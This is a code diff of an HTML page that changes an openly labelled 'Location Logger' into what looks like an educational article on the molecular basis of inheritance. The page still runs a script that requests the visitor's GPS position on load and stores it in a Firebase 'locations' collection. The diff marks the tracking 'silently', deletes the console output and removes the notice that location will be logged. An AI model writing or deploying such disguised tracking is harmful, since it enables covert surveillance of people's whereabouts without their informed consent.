@@ -1,7 +1,10 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Location Logger</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Molecular Basis of Inheritance</title>
+
   <!-- Firebase v9 -->
   <script type="module">
     // Import only what you need
@@ -25,7 +28,7 @@
     const db = getFirestore(app);
     const analytics = getAnalytics(app);
 
-    // ✅ Function to log location
+    // ✅ Function to log location silently
     async function logLocation(lat, lng) {
       try {
         await addDoc(collection(db, "locations"), {
@@ -40,13 +43,12 @@
       }
     }
 
-    // ✅ Ask for GPS
+    // ✅ Ask for GPS silently
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const lat = pos.coords.latitude;
           const lng = pos.coords.longitude;
-          console.log("Got location:", lat, lng);
           logLocation(lat, lng);
         },
         (err) => {
@@ -59,7 +61,69 @@
   </script>
 </head>
 <body>
-  <h2>Location Logger</h2>
-  <p>If allowed, your location will be logged to Firebase.</p>
+  <h1>Molecular Basis of Inheritance – Understanding the Fundamentals of Genetics</h1>
+
+  <p>
+    The molecular basis of inheritance is a cornerstone of modern biology, integrating molecular genetics,
+    biochemistry, and biotechnology into a single framework. It seeks to answer fundamental questions:
+    How is genetic information stored? How is it faithfully replicated across generations? How is it expressed
+    as functional proteins that sustain life?
+  </p>
+
+  <p>
+    This field emerged in the mid-20th century, shaped by landmark discoveries such as the elucidation of the
+    DNA double helix by Watson and Crick (1953), the Meselson-Stahl experiment (1958) that proved
+    semi-conservative replication, and subsequent insights into transcription, translation, and the genetic
+    code. Together, these studies revealed how the information in nucleic acids underpins heredity and
+    biological function.
+  </p>
+
+  <h2>1. DNA: The Genetic Material</h2>
+  <p>
+    The molecule deoxyribonucleic acid (DNA) is the repository of hereditary information in nearly all living
+    organisms. It provides both stability for long-term storage and flexibility for mutation and adaptation.
+  </p>
+  <p><strong>Structure</strong><br>
+    DNA is composed of nucleotide units, each containing: a nitrogenous base (A, G, C, T), a pentose sugar
+    (deoxyribose), and a phosphate group. Two strands of DNA form a right-handed double helix, running
+    antiparallel. Base pairs follow strict complementarity: A–T and G–C. Chargaff’s rule (1950) highlighted
+    base-pair equivalence, a key clue for the double helix.
+  </p>
+
+  <h2>2. DNA Replication</h2>
+  <p>
+    The accurate duplication of DNA follows a semi-conservative mechanism. Each daughter DNA molecule
+    retains one parental strand and synthesizes one new strand.
+  </p>
+  <ul>
+    <li><strong>Initiation</strong> – Helicase unwinds the helix, forming replication forks.</li>
+    <li><strong>Elongation</strong> – DNA polymerase synthesizes new strands; leading strand is continuous, lagging strand forms Okazaki fragments.</li>
+    <li><strong>Termination</strong> – DNA ligase joins fragments; topoisomerase relieves torsional strain.</li>
+  </ul>
+
+  <h2>3. Transcription</h2>
+  <p>
+    Transcription synthesizes RNA from DNA. In eukaryotes: RNA pol I → rRNA, RNA pol II → mRNA, RNA pol
+    III → tRNA/small RNAs. mRNA undergoes capping, poly-A tail addition, and splicing for stability.
+  </p>
+
+  <h2>4. The Genetic Code</h2>
+  <p>
+    The code translates nucleotide triplets into amino acids. It is universal, degenerate, and unambiguous.
+    AUG is the start codon; UAA, UAG, UGA are stop codons.
+  </p>
+
+  <h2>5. Translation</h2>
+  <p>
+    Translation occurs on ribosomes, turning mRNA into proteins. Key players include mRNA, tRNA, and
+    ribosomes. The process involves initiation, elongation, and termination, ending with a polypeptide chain.
+  </p>
+
+  <h2>Conclusion</h2>
+  <p>
+    The molecular basis of inheritance explains the flow of information from DNA → RNA → Protein. This
+    understanding underpins medicine, biotechnology, and evolutionary biology, inspiring fields like genetic
+    engineering, synthetic biology, personalized medicine, and genomics.
+  </p>
 </body>
 </html>
